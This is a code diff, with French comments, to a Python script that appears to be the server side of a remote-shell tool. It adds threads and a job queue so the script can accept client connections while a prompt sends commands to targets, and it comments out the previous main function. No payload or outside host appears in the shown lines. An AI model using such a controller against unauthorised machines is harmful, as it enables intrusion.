@@ -114,6 +114,33 @@ def send_trgt_cmd(conn):
             print("Connection has been lost")
             break
 
+# Threads
+def create_threads():
+    for a in range(THREADS):
+        t = threading.Thread(target=work)  # target = le job qu'il va faire
+        t.daemon = True  #Permet de kill le thread en même temps que la fonction principal
+        t.start()
+
+# Définir work pour faire les deux jobs (maintenir la connection et envoyer des commandes)
+def work():
+    while True:
+        x = queue.get()
+        if x == 1:
+            socket_creation()
+            socket_bind()
+            accept_socket()
+        if x == 2:
+            start_prompt()
+        queue.task_done()  #libérer la mémoire quand le tache est finie
+
+# Jobs
+def create_jobs():
+    for x in NUMBER:
+        queue.put(x)
+    queue.join()
+
+create_threads()
+create_jobs()
 
 """
 # Version Précédente !
@@ -130,6 +157,7 @@ def send_commands(conn):
             print(client_response, end="")
 """
 
+"""
 def main(): #creation d'une fonction qui contient chaque étape (sauf l'envoie de commandes car il se fait déjà dans la fonction accept_socket()
     socket_creation()
     socket_bind()
@@ -137,3 +165,4 @@ def main(): #creation d'une fonction qui contient chaque étape (sauf l'envoie d
 
 main() #Appel de la fonction principale
 
+"""
